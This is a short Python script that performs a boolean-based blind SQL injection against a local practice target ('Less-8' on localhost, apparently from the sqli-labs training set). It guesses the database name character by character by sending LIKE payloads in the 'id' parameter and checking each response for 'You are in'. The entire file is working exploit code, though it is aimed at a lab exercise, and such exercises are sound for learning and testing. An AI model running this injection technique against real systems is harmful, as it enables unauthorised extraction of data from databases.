import requests
name = ''
url = "http://localhost:8989/Less-8"
s = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in range(0, 8):
    for c in s:
        x = name + c
        x += '%'
        payload = {'id': f"1' and database() like '{x}'#"}
        r = requests.get(url, params=payload)
        if 'You are in' in r.text:
            name += c
            break
print(name)